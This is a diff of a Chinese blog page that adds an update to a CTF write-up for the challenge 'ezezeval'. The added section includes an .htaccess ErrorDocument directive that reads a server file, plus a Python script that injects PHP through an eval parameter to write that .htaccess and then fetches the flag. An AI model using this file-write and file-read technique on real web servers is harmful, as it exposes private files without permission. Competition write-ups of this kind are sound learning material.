@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gz.imxbt.cn/assets/695e018a8a4d3da56d3a5b79ce7c9f6b8005de82de7494eca4a69bc87db49178/poster">
 <meta property="article:published_time" content="2026-02-03T01:51:07.000Z">
-<meta property="article:modified_time" content="2026-02-15T02:24:32.635Z">
+<meta property="article:modified_time" content="2026-02-23T07:04:53.916Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://gz.imxbt.cn/assets/695e018a8a4d3da56d3a5b79ce7c9f6b8005de82de7494eca4a69bc87db49178/poster">
@@ -253,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          868 字
+          1.1k 字
         
       </span>
     
@@ -264,7 +264,7 @@
         
         
         
-          8 分钟
+          10 分钟
         
       </span>
     
@@ -306,7 +306,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年2月15日 上午
+                    本文最后更新于 2026年2月23日 下午
                   
                 
               </p>
@@ -341,6 +341,17 @@
 <h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2098193">C语言的整型溢出问题 int、long、long long取值范围 最大最小值「建议收藏」-腾讯云开发者社区-腾讯云</a></p>
 <h2 id="ezezeval"><a href="#ezezeval" class="headerlink" title="ezezeval"></a>ezezeval</h2><p>挑战题，照着XCTF的wp做，在一步上卡住了</p>
 <p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260215102349049.png" srcset="/img/loading.gif" lazyload alt="image-20260215102349049"></p>
+<h3 id="补档"><a href="#补档" class="headerlink" title="补档"></a>补档</h3><p>XCTF的方法不能用是因为sqlite3被禁了</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260223133305649.png" srcset="/img/loading.gif" lazyload alt="image-20260223133305649"></p>
+<p>绕过disabled_functions的常见方法也都不行，但这道题关键的是提示了flag在&#x2F;love114514，所以只需要读文件就行了</p>
+<p>在htaccess容器的内部指令中有一个<code>ErrorDocument</code>可以让我们自定义错误页面，所以直接上传一个htaccess文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ErrorDocument</span> <span class="hljs-number">404</span> <span class="hljs-string">&quot;%&#123;file:/love1145141919810&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;http://challenge.imxbt.cn:32152/&quot;</span><br><br>filename = <span class="hljs-string">&quot;.htaccess&quot;</span><br>content = <span class="hljs-string">&quot;&quot;&quot;ErrorDocument 404 &quot;%&#123;file:/love1145141919810&#125;&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>bs64_content = base64.b64encode(content.encode()).decode()<br>cmd = <span class="hljs-string">f&quot;file_put_contents(\&quot;<span class="hljs-subst">&#123;filename&#125;</span>\&quot;, base64_decode(&#x27;<span class="hljs-subst">&#123;bs64_content&#125;</span>&#x27;));&quot;</span><br><br>data = &#123; <span class="hljs-string">&quot;Wl&amp;come_to!Pctf_2025?&quot;</span> : cmd &#125;<br>requests.post(url, data=data)<br><br>target = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/error&quot;</span><br>res = requests.get(target)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;上传文件名为:<span class="hljs-subst">&#123;filename&#125;</span>, 文件内容为:<span class="hljs-subst">&#123;content&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;访问: <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>
+
+<h3 id="参考文献-1"><a href="#参考文献-1" class="headerlink" title="参考文献"></a>参考文献</h3><p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/11/01/%E6%9C%80%E6%96%B0%E7%89%88-php-%E7%BB%95-open_basedir-%E5%92%8C-disable_functions/">最新版 PHP 绕 open_basedir 和 disable_functions – fushulingのblog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">Open_basedir绕过 - LLeaves - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://pr0x1ma.top/posts/htaccess/">htaccess | Pr0x1ma’blog</a></p>
 
                 
               </div>
